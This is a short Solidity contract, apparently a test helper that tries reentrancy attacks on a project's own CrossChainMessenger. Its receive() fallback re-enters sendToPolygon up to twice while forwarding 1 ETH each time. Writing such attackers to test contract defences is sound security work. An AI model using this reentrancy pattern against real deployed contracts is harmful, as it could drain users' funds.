// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "../CrossChainMessenger.sol";

contract ReentrancyAttacker {
    CrossChainMessenger public messenger;
    uint256 public attackCount;

    receive() external payable {
        if (attackCount < 2) {
            attackCount++;
            // Try to reenter the messenger contract
            messenger.sendToPolygon{value: 1 ether}(address(this));
        }
    }

    function attack(address _messenger) external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        messenger = CrossChainMessenger(_messenger);
        attackCount = 0;
        messenger.sendToPolygon{value: 1 ether}(address(this));
    }
}
